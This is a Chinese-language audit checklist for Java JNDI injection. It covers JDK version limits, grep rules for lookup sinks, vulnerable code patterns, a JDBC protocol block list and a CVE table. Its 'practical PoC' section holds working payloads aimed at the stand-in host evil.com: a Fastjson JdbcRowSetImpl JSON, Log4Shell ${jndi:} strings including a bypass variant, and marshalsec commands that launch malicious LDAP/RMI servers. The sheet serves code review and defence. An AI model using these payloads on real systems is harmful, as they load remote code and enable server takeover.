# Java JNDI Injection - JNDI 注入完整审计规则

> JNDI (Java Naming and Directory Interface) 注入漏洞深度分析

---

## JNDI 注入三要素

1. 应用调用了 `lookup()` 或 `search()` 方法
2. 参数部分或全部可控
3. 攻击者可以搭建恶意 RMI/LDAP 服务

### Reference 远程类加载流程
```
lookup("rmi://evil.com/Exploit")
  -> RMI 返回 Reference -> 客户端下载 .class -> 实例化 -> static块执行 -> RCE
```

---

## JDK 版本限制

| JDK 版本 | RMI Reference | LDAP Reference | 本地 Gadget |
|---------|--------------|---------------|------------|
| < 6u141, 7u131 | 可用 | 可用 | 可用 |
| 6u141 ~ 8u190 | 禁止 | 可用 | 可用 |
| 8u191, 11.0.1+ | 禁止 | 禁止 | 可用 |

**高版本绕过**: 本地classpath Gadget / LDAP返回序列化对象 / Tomcat BeanFactory

---

## 代码审计检测

```bash
grep -rn "InitialContext\|\.lookup\(" --include="*.java" | grep -v "^//"
grep -rn "\.search\(" --include="*.java"
grep -rn "new Reference" --include="*.java"
```

### 危险模式
```java
// ❌ 高危: URL 完全可控
String url = request.getParameter("url");
ctx.lookup(url);

// ❌ 高危: 名称可控
ctx.lookup("rmi://internal:1099/" + request.getParameter("name"));

// ❌ 中危: 从数据库/配置读取
ctx.lookup(database.getConfig("jndi.url"));
```

### 污点追踪
```
Source: request.getParameter / getHeader / System.getProperty / properties.getProperty
Sink: InitialContext.lookup() / Context.lookupLink() / DirContext.search()
```

---

## 实战 PoC

### Fastjson + JNDI
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com:1099/Exploit","autoCommit":true}
```
流程: Fastjson反序列化 -> setDataSourceName -> setAutoCommit -> connect() -> lookup()

### Log4j2 (CVE-2021-44228)
```
${jndi:rmi://evil.com:1099/Exploit}
${jndi:ldap://evil.com:1389/Exploit}
${jndi:ldap://127.0.0.1#evil.com:1389/Exploit}
```
影响: Log4j 2.0-beta9 ~ 2.14.1

### 工具启动
```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://evil.com:8080/#Exploit" 1389
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://evil.com:8080/#Exploit" 1099
```

---

## JDBC 协议注入 (CVE-2025-64428)

JDBC URL可控时需检查完整协议黑名单:

| 协议 | 风险 | CVE |
|------|------|-----|
| `ldap://` / `ldaps://` | JNDI注入 | CVE-2025-64164 |
| `rmi://` | JNDI注入 | - |
| `iiop://` / `iiopname:` / `corbaname:` | JNDI注入 | CVE-2025-64428 |
| `dns://` | SSRF | CVE-2025-64163 |
| `file://` / `ftp://` / `http://` | SSRF/文件读取 | - |

```bash
grep -rn "jdbc:\|JdbcRowSet\|dataSourceName" --include="*.java"
grep -rn "iiop://\|iiopname:\|corbaname:\|corbaloc:" --include="*.java"
grep -rn "illegalParameters\|blacklist\|getIllegal" --include="*.java"
```

**常见遗漏**: 黑名单缺少 iiop/corbaname 协议 + 大小写绕过

---

## 相关 CVE

| CVE | 组件 | 影响版本 |
|-----|------|---------|
| CVE-2021-44228 | Log4j2 | 2.0-beta9 ~ 2.14.1 |
| CVE-2021-45046 | Log4j2 | 2.15.0 |
| CVE-2020-1948 | Dubbo | 2.7.0 ~ 2.7.6 |
| CVE-2016-4437 | Shiro | < 1.2.5 |
| CVE-2019-2725 | Weblogic | 10.3.6, 12.1.3 |
| CVE-2017-18349 | Fastjson | < 1.2.24 |
| CVE-2025-64428 | DataEase | < 2.10.17 |
